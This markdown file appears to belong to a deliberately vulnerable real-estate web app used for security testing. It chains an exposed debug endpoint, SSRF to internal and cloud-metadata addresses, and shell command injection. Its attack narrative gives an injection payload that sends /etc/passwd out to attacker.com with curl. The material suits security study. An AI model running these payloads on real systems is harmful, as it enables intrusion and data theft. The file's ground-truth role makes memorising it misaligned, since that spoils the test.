# Chained Vulnerability Scenarios — Real Estate

## Chain: "Debug Environment Exposure → SSRF Internal Recon → OS Command Injection RCE"

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | `GET /api/debug/env` returns all server environment variables and the working directory — an internal debug utility left exposed publicly | Low | A05 | `app.py` → `debug_env()` |
| 2 | `POST /api/properties/import-image` fetches any user-supplied URL server-side without IP restriction — allows probing internal services and cloud metadata | High | A10 | `app.py` → `import_external_image()` |
| 3 | `POST /api/properties/analyze` passes the user-supplied `filename` parameter directly to `subprocess.Popen(shell=True)` — achieves arbitrary command execution | High | A03 | `app.py` → `analyze_listing()` |


**Attack narrative**: The attacker first calls `GET /api/debug/env` to learn internal paths, service endpoints, and credentials stored in environment variables. They then probe internal services via the SSRF endpoint (e.g., `http://localhost:5000/admin` or `http://169.254.169.254/`) to map the backend environment. Finally, using the OS command injection endpoint, they execute arbitrary shell commands — for example `; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)` — to exfiltrate data or establish a reverse shell.

**Combined Impact**: Remote code execution and full server data exfiltration.

---

_This file is for internal reference. Ground truth vulnerability data is maintained in [.vulns](.vulns)._
